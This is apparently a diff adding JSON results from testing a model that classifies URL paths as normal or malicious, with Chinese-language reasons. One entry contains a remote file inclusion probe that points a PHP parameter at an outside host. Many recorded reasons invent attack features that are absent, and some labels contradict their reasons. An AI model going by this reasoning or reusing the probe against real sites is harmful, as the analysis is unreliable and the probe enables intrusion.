@@ -1,0 +1,4002 @@
+[
+  {
+    "url": "/103886/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /103886 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.504,
+    "raw_response": "- 0 表示正常URL\n\nURL: /103886 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rcanimal/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /rcanimal/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.45,
+    "raw_response": "- 0 表示正常URL\n\nURL: /rcanimal/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/458010b88d9ce/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.803,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cclogovs/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cclogovs/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.571,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cclogovs/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/using-localization/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /using-localization 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.704,
+    "raw_response": "- 0 表示正常URL\n\nURL: /using-localization 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/121006_dakotacwpressconf/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.856,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/50393994/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /50393994 是一个合法的Web请求，符合正常请求特征。该URL没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。因此，该URL是安全的。",
+    "elapsed_time_sec": 1.723,
+    "raw_response": "- 0 表示正常URL\n\nURL: /50393994 是一个合法的Web请求，符合正常请求特征。该URL没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。因此，该URL是安全的。",
+    "true_label": "0"
+  },
+  {
+    "url": "/169393/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /169393 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.553,
+    "raw_response": "- 0 表示正常URL\n\nURL: /169393 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/166636/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /166636 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.532,
+    "raw_response": "- 0 表示正常URL\n\nURL: /166636 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/labview_v2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /labview_v2/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.981,
+    "raw_response": "- 0 表示正常URL\n\nURL: /labview_v2/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/nets.png",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且代码中使用了`/javascript/nets.png`作为路径，这属于典型的恶意攻击特征，特别是命令执行和路径遍历。",
+    "elapsed_time_sec": 1.434,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且代码中使用了`/javascript/nets.png`作为路径，这属于典型的恶意攻击特征，特别是命令执行和路径遍历。",
+    "true_label": "0"
+  },
+  {
+    "url": "/p25-03/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /p25-03/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.795,
+    "raw_response": "- 0 表示正常URL\n\nURL: /p25-03/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/minute.rb",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.941,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/weblogs.rss",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/weblogs.rss`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意插入到网页中，从而窃取用户数据或执行恶意操作。",
+    "elapsed_time_sec": 1.607,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/weblogs.rss`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意插入到网页中，从而窃取用户数据或执行恶意操作。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/util.rtf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.897,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/180742/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /180742 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.449,
+    "raw_response": "- 0 表示正常URL\n\nURL: /180742 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/typo3conf.do",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/typo3conf.do`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS或命令执行。",
+    "elapsed_time_sec": 1.397,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/typo3conf.do`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS或命令执行。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000054736/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000054736 是一个合法的Web请求，没有包含任何恶意攻击特征。它符合正常请求的定义，即仅包含常规路径和静态资源访问，且参数值为正常的业务数据。",
+    "elapsed_time_sec": 1.576,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000054736 是一个合法的Web请求，没有包含任何恶意攻击特征。它符合正常请求的定义，即仅包含常规路径和静态资源访问，且参数值为正常的业务数据。",
+    "true_label": "0"
+  },
+  {
+    "url": "/175034/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /175034 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.525,
+    "raw_response": "- 0 表示正常URL\n\nURL: /175034 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/epsilon-0/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /epsilon-0/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.55,
+    "raw_response": "- 0 表示正常URL\n\nURL: /epsilon-0/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/155470/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /155470 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.439,
+    "raw_response": "- 0 表示正常URL\n\nURL: /155470 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000023204/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000023204 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.527,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000023204 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/radio_explorer/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.81,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/jadedem/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /jadedem/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.538,
+    "raw_response": "- 0 表示正常URL\n\nURL: /jadedem/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/legacy.swf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/legacy.swf`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS、命令执行或路径遍历。",
+    "elapsed_time_sec": 1.399,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/legacy.swf`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS、命令执行或路径遍历。",
+    "true_label": "0"
+  },
+  {
+    "url": "/network-forensics/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /network-forensics/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.38,
+    "raw_response": "- 0 表示正常URL\n\nURL: /network-forensics/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/free-cookies/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /free-cookies/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.518,
+    "raw_response": "- 0 表示正常URL\n\nURL: /free-cookies/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/yukonvotes2006/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /yukonvotes2006/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.685,
+    "raw_response": "- 0 表示正常URL\n\nURL: /yukonvotes2006/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/weblinks_panel/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /weblinks_panel/ 是一个正常请求，符合标准的Web请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.936,
+    "raw_response": "- 0 表示正常URL\n\nURL: /weblinks_panel/ 是一个正常请求，符合标准的Web请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/131252/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /131252/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.437,
+    "raw_response": "- 0 表示正常URL\n\nURL: /131252/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20051025/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20051025 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.462,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20051025 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/fn.mdb",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/fn.mdb`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。",
+    "elapsed_time_sec": 1.563,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/fn.mdb`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2165498/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /2165498 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.521,
+    "raw_response": "- 0 表示正常URL\n\nURL: /2165498 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/newsbordertop/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /newsbordertop/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.673,
+    "raw_response": "- 0 表示正常URL\n\nURL: /newsbordertop/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/traceroute.vb",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/traceroute.vb`，这属于典型的XSS攻击特征，因为XSS攻击通常会包含`<script>`标签来执行恶意代码。",
+    "elapsed_time_sec": 1.432,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/traceroute.vb`，这属于典型的XSS攻击特征，因为XSS攻击通常会包含`<script>`标签来执行恶意代码。",
+    "true_label": "0"
+  },
+  {
+    "url": "/computingbusiness/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /computingbusiness/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.985,
+    "raw_response": "- 0 表示正常URL\n\nURL: /computingbusiness/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/parabolic/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /parabolic/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.866,
+    "raw_response": "- 0 表示正常URL\n\nURL: /parabolic/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/side2-bottomright/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /side2-bottomright/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.544,
+    "raw_response": "- 0 表示正常URL\n\nURL: /side2-bottomright/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：`|`（命令注入）",
+    "elapsed_time_sec": 0.867,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：`|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/usr.ep",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）等恶意特征",
+    "elapsed_time_sec": 1.195,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）等恶意特征",
+    "true_label": "0"
+  },
+  {
+    "url": "/page-13/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /page-13/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.951,
+    "raw_response": "- 0 表示正常URL\n\nURL: /page-13/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/comxast/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.848,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dj mortis - stringent bass/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历。路径遍历是指攻击者通过构造恶意路径（如 `/dj mortis - stringent bass/`）来访问敏感系统或数据库，这通常用于执行命令或获取敏感信息。",
+    "elapsed_time_sec": 1.7,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历。路径遍历是指攻击者通过构造恶意路径（如 `/dj mortis - stringent bass/`）来访问敏感系统或数据库，这通常用于执行命令或获取敏感信息。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/children.war",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.087,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/hadleys_mill/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /hadleys_mill/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.718,
+    "raw_response": "- 0 表示正常URL\n\nURL: /hadleys_mill/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/project.dump",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）",
+    "elapsed_time_sec": 1.125,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）",
+    "true_label": "0"
+  },
+  {
+    "url": "/learn-php/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /learn-php 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.546,
+    "raw_response": "- 0 表示正常URL\n\nURL: /learn-php 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/sunsmavs_6/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /sunsmavs_6/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.472,
+    "raw_response": "- 0 表示正常URL\n\nURL: /sunsmavs_6/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/127465/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /127465 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.453,
+    "raw_response": "- 0 表示正常URL\n\nURL: /127465 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/158961/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /158961 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.428,
+    "raw_response": "- 0 表示正常URL\n\nURL: /158961 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/encryption primer/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n判断理由：该URL是合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.861,
+    "raw_response": "- 0 表示正常URL\n\n判断理由：该URL是合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/whores/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /whores/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.552,
+    "raw_response": "- 0 表示正常URL\n\nURL: /whores/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/162959/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /162959 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.451,
+    "raw_response": "- 0 表示正常URL\n\nURL: /162959 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/pt.jpg",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.146,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/landing_template/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /landing_template/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.899,
+    "raw_response": "- 0 表示正常URL\n\nURL: /landing_template/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dualdisc/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /dualdisc/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.936,
+    "raw_response": "- 0 表示正常URL\n\nURL: /dualdisc/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/customerssupport/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL是正常Web请求，符合安全标准。正常请求应仅包含常规路径和静态资源访问，且参数值应为业务数据，无攻击性特征。",
+    "elapsed_time_sec": 1.2,
+    "raw_response": "- 0 表示正常URL\n\n该URL是正常Web请求，符合安全标准。正常请求应仅包含常规路径和静态资源访问，且参数值应为业务数据，无攻击性特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/foundation.bak",
+    "predicted": "0",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征。此外，URL中没有正常的业务数据，也没有其他攻击特征。",
+    "elapsed_time_sec": 1.304,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征。此外，URL中没有正常的业务数据，也没有其他攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1613507851457d13c035b6e/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）",
+    "elapsed_time_sec": 1.154,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/iissamples.php3",
+    "predicted": "0",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/iissamples.php3`，其中`javascript`和`iissamples.php3`明显是JavaScript代码，这属于XSS攻击的典型特征。此外，URL中没有正常的业务数据或参数，也没有明显的SQL注入、命令执行等攻击特征。",
+    "elapsed_time_sec": 1.957,
